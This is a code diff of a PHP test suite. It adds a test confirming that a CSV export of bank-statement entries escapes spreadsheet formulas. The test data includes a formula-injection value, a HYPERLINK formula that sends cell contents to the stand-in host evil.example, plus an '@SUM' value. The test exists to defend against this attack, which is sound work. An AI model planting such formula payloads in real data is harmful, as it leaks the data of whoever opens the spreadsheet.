@@ -27,8 +27,6 @@ beforeEach(function (): void {
         $this->markTestSkipped('Needs a real Postgres connection — run `make check-php-pg`.');
     }
 
-    bootstrapIdentityCryptoForTests();
-
     $this->app->instance(
         SubjectDekService::class,
         new SubjectDekService(new InMemoryKeyManagementService(), new InMemoryDekRepository()),
@@ -161,4 +159,23 @@ it('records every download in the audit chain', function (): void {
 
     expect($event)->not->toBeNull()
         ->and($event?->resource_type)->toBe('wallet_report');
+});
+
+it('exports a counterparty or description a stranger wrote as text, never as a formula', function (): void {
+    // Both come from a bank statement, where whoever paid or charged chose them. Opened in Excel, a
+    // cell starting with `=` would run.
+    [$user, $subjectId, $accountId] = exportingSubject();
+
+    record($this, $user, $subjectId, $accountId, -90_000, [
+        'counterparty' => '=HYPERLINK("https://evil.example/?"&A2,"Dedeman")',
+        'description' => '@SUM(A1:A9)',
+    ]);
+
+    $body = exportPart($this, $user, $subjectId, 'largest');
+
+    expect($body)
+        ->toContain('"\'=HYPERLINK(""https://evil.example/?""&A2,""Dedeman"")"')
+        ->toContain("'@SUM(A1:A9)")
+        // The amount beside them is still a number a spreadsheet adds up.
+        ->toContain(',-900.00,');
 });
